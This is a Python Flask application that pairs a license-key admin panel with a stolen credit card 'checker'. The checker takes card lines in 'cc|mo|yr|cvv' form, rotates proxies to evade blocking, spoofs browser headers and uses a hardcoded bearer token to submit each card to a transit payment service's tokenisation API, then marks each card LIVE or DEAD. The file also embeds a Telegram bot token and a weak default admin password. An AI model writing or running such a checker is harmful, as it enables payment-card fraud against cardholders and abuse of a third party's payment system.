import os
import json
import random
import string
import urllib.request
import queue
import threading
import time
import base64
from flask import Flask, request, jsonify, render_template, Response
from datetime import datetime, timedelta, timezone

# Safe imports for crypto
try:
    from jose import jwe
    from jose.utils import base64url_encode
except ImportError:
    jwe = None
    base64url_encode = None

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
DB_FILE = 'keys.json'
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6516330870")

# Checker Globals
checker_queue = queue.Queue()
checker_stop_event = threading.Event()

def send_telegram_alert(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def calculate_expiration_utc(amount, unit):
    if not amount or unit == 'lifetime':
        return None
    try:
        val = int(amount)
        now = datetime.now(timezone.utc)
        if unit == 'minutes':
            exp = now + timedelta(minutes=val)
        elif unit == 'hours':
            exp = now + timedelta(hours=val)
        elif unit == 'days':
            exp = now + timedelta(days=val)
        elif unit == 'months':
            exp = now + timedelta(days=val * 30)
        elif unit == 'years':
            exp = now + timedelta(days=val * 365)
        else:
            return None
        return int(exp.timestamp())
    except Exception:
        return None

# --- Routes ---

@app.route('/')
def home():
    return render_template('admin.html')

@app.route('/checker')
def checker_page():
    return render_template('checker.html')

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json() or {}
    if data.get('password') == ADMIN_PASSWORD:
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Incorrect password!"})

@app.route('/api/keys', methods=['GET', 'POST'])
def handle_keys():
    keys_data = load_db()

    if request.method == 'GET':
        result = []
        now_ts = int(datetime.now(timezone.utc).timestamp())
        updated = False

        for key, info in keys_data.items():
            expires_ts = info.get('expires_ts')
            status = info.get('status', 'active')

            if expires_ts and status == 'active':
                if now_ts > expires_ts:
                    status = 'expired'
                    keys_data[key]['status'] = 'expired'
                    updated = True

            result.append({
                "key": key,
                "expires_ts": expires_ts,
                "status": status,
                "device_id": info.get('device_id', '')
            })

        if updated:
            save_db(keys_data)

        return jsonify({"success": True, "keys": result})

    elif request.method == 'POST':
        data = request.get_json() or {}
        custom_key = str(data.get('key', '')).strip()
        duration_val = data.get('duration_val', '1')
        duration_unit = data.get('duration_unit', 'lifetime')
        quantity = min(max(int(data.get('quantity', 1)), 1), 100)
        notify_tg = data.get('notify_tg', False)

        exp_ts = calculate_expiration_utc(duration_val, duration_unit)
        created_keys = []

        if custom_key and quantity == 1:
            if custom_key in keys_data:
                return jsonify({"success": False, "message": "Key already exists!"})
            keys_data[custom_key] = {
                "expires_ts": exp_ts,
                "status": "active",
                "device_id": ""
            }
            created_keys.append(custom_key)
        else:
            prefix = custom_key if custom_key else "KYU"
            for _ in range(quantity):
                while True:
                    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                    new_key = f"{prefix}-{part1}-{part2}"
                    if new_key not in keys_data:
                        break
                keys_data[new_key] = {
                    "expires_ts": exp_ts,
                    "status": "active",
                    "device_id": ""
                }
                created_keys.append(new_key)

        save_db(keys_data)

        if notify_tg and created_keys:
            exp_label = f"{duration_val} {duration_unit.capitalize()}" if exp_ts else "Lifetime"
            keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
            tg_msg = (
                f"<b>⚡ KYU AUTH - LICENSE GENERATOR ⚡</b>\n\n"
                f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
                f"⏳ <b>Duration:</b> <code>{exp_label}</code>\n\n"
                f"{keys_formatted}"
            )
            send_telegram_alert(tg_msg)

        return jsonify({"success": True, "keys": created_keys})

@app.route('/api/keys/<path:key_id>', methods=['PUT', 'DELETE'])
def modify_key(key_id):
    keys_data = load_db()
    if key_id not in keys_data:
        return jsonify({"success": False, "message": "Key not found"}), 404

    if request.method == 'DELETE':
        del keys_data[key_id]
        save_db(keys_data)
        return jsonify({"success": True, "message": "Deleted"})
    elif request.method == 'PUT':
        data = request.get_json() or {}
        if data.get('action') == 'reset_hwid':
            keys_data[key_id]['device_id'] = ""
        else:
            keys_data[key_id]['expires_ts'] = calculate_expiration_utc(data.get('duration_val', '1'), data.get('duration_unit', 'lifetime'))
            keys_data[key_id]['status'] = 'active'
        save_db(keys_data)
        return jsonify({"success": True, "message": "Updated"})

@app.route('/verify.php', methods=['POST'])
def verify_key():
    data = request.get_json() or {}
    incoming_key = str(data.get('key', '')).strip()
    device_id = str(data.get('device_id', '')).strip()

    if not incoming_key:
        return jsonify({"success": False, "message": "Empty key."})
    keys_data = load_db()
    if incoming_key not in keys_data:
        return jsonify({"success": False, "message": "Invalid key."})

    key_info = keys_data[incoming_key]
    if key_info.get('status') != 'active':
        return jsonify({"success": False, "message": "Key inactive/expired."})

    expires_ts = key_info.get('expires_ts')
    if expires_ts and int(datetime.now(timezone.utc).timestamp()) > expires_ts:
        key_info['status'] = 'expired'
        save_db(keys_data)
        return jsonify({"success": False, "message": "Key expired."})

    stored_device = key_info.get('device_id', '')
    if not stored_device:
        key_info['device_id'] = device_id
        save_db(keys_data)
    elif stored_device != device_id:
        return jsonify({"success": False, "message": "HWID mismatch."})

    return jsonify({"success": True, "expires_ts": expires_ts})

# --- Web Checker Logic ---

TOKENISATION_BASE = "https://web.uk.littlepay.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
INLINE_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"

class WebProxyPool:
    def __init__(self, raw_proxies):
        self.proxies = [p.strip() for p in raw_proxies if p.strip()]
        self.i = 0
        self.lock = threading.Lock()

    def next(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.i % len(self.proxies)]
            self.i += 1
        if "://" not in p:
            parts = p.split(":")
            if len(parts) == 2:
                p = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                h, po, u, pw = parts
                safe_pw = urllib.parse.quote(pw, safe='')
                p = f"http://{u}:{safe_pw}@{h}:{po}"
        return {"http": p, "https": p}

def test_proxy(proxy_dict):
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def check_single_card(card_line, proxy_pool, custom_cookies=""):
    parts = card_line.split("|")
    if len(parts) < 3:
        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
    
    cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
    cvv = parts[3].strip() if len(parts) > 3 else ""
    expiry = f"{mo}/{yr[-2:]}"
    card_type = "visa" if cc.startswith("4") else "mastercard"

    session = requests.Session()
    session.trust_env = False
    p_dict = proxy_pool.next() if proxy_pool else None

    if custom_cookies:
        for c in custom_cookies.split(";"):
            if "=" in c:
                k, v = c.split("=", 1)
                session.cookies.set(k.strip(), v.strip(), domain=".littlepay.com")

    headers = {
        "Authorization": f"Bearer {INLINE_BEARER_TOKEN}",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://coastrta.littlepay.com",
        "Referer": "https://coastrta.littlepay.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Connection": "keep-alive"
    }

    try:
        if not custom_cookies:
            try:
                session.get("https://coastrta.littlepay.com/en/coast-rta/trip-history", headers={**headers, "Accept": "text/html"}, proxies=p_dict, timeout=8, verify=False)
            except Exception:
                pass

        r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
                        headers=headers, 
                        proxies=p_dict, timeout=10, verify=False)
        if r.status_code != 200:
            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
        
        keys = r.json().get("list", [])
        if not keys:
            return 2, "ERROR", "No public keys"
        key_entry = random.choice(keys)

        payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
        if cvv: payload["card_cvv"] = cvv

        if jwe and base64url_encode:
            mod_hex = key_entry["modulus"].replace(":", "")
            exp_int = int(key_entry["exponent"])
            exp_hex = format(exp_int, "x")
            if len(exp_hex) % 2 != 0: exp_hex = "0" + exp_hex

            jwk = {
                "kty": "RSA",
                "n": base64url_encode(bytes.fromhex(mod_hex)).decode("ascii"),
                "e": base64url_encode(bytes.fromhex(exp_hex)).decode("ascii"),
            }
            jwe_token = jwe.encrypt(json.dumps(payload).encode("utf-8"), jwk, encryption="A128CBC-HS256", algorithm="RSA-OAEP").decode("ascii")
        else:
            return 2, "ERROR", "Missing python-jose dependency"

        auth_headers = headers.copy()
        auth_headers["Content-Type"] = "application/json"

        r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
                          headers=auth_headers,
                          json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
                          proxies=p_dict, timeout=10, verify=False)
        
        try:
            res_data = r2.json()
        except Exception:
            res_data = {"status": "ERROR"}

        status = str(res_data.get("status") or res_data.get("state") or "").upper()
        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, "DEAD", f"CARD_DECLINED ({status})"
        
        auth_id = res_data.get("authentication_id")
        if not auth_id:
            return 1, "DEAD", "CARD_DECLINED"

        r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
                       headers=headers,
                       proxies=p_dict, timeout=10, verify=False)
        
        try:
            tok_data = r3.json()
        except Exception:
            tok_data = {}

        tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"

        if tok_data.get("authenticated_payment_token"):
            return 0, "LIVE", "APPROVED"
        
        return 1, "DEAD", "DECLINED"

    except Exception as e:
        err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
        return 2, "ERROR", err_msg or "Exception"

def background_worker(cards, proxies_list, cookies_str=""):
    raw_pool = WebProxyPool(proxies_list)
    valid_proxies = []
    total_proxies = len(raw_pool.proxies)

    if total_proxies > 0:
        checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
        for p_str in raw_pool.proxies:
            p = p_str
            if "://" not in p:
                parts = p.split(":")
                if len(parts) == 2:
                    p = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    h, po, u, pw = parts
                    safe_pw = urllib.parse.quote(pw, safe='')
                    p = f"http://{u}:{safe_pw}@{h}:{po}"
            p_dict = {"http": p, "https": p}
            if test_proxy(p_dict):
                valid_proxies.append(p_str)
        
        proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
        checker_queue.put({"status_msg": f"Proxy check done: {len(valid_proxies)}/{total_proxies} working."})
    else:
        proxy_pool = None
        checker_queue.put({"status_msg": "Running proxyless mode."})

    counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}

    for card in cards:
        if checker_stop_event.is_set():
            break
        
        if total_proxies > 0 and proxy_pool and not proxy_pool.proxies:
            checker_queue.put({
                "card": card, "status": "ERROR", "code": 2, "detail": "All proxies failed health check", **counts
            })
            counts["checked"] += 1
            counts["error"] += 1
            continue

        code, status, detail = check_single_card(card, proxy_pool, cookies_str)
        counts["checked"] += 1
        if code == 0: counts["live"] += 1
        elif code == 1: counts["dead"] += 1
        else: counts["error"] += 1

        checker_queue.put({
            "card": card,
            "status": status,
            "code": code,
            "detail": detail,
            **counts
        })
        time.sleep(0.2)

    checker_queue.put({"finished": True, **counts})

@app.route('/api/checker/start', methods=['POST'])
def api_checker_start():
    global checker_queue, checker_stop_event
    checker_stop_event.set()
    while not checker_queue.empty():
        try: checker_queue.get_nowait()
        except: pass

    checker_stop_event = threading.Event()
    data = request.get_json() or {}
    cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
    proxies = [line.strip() for line in data.get('proxies', '').split('\n') if line.strip()]
    cookies = data.get('cookies', '').strip()

    if not cards:
        return jsonify({"success": False, "message": "No cards provided"}), 400

    threading.Thread(target=background_worker, args=(cards, proxies, cookies), daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/checker/stop', methods=['POST'])
def api_checker_stop():
    checker_stop_event.set()
    return jsonify({"success": True})

@app.route('/api/checker/stream')
def api_checker_stream():
    def event_stream():
        while not checker_stop_event.is_set():
            try:
                data = checker_queue.get(timeout=1.0)
                yield f"data: {json.dumps(data)}\n\n"
                if data.get("finished"):
                    break
            except queue.Empty:
                continue
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
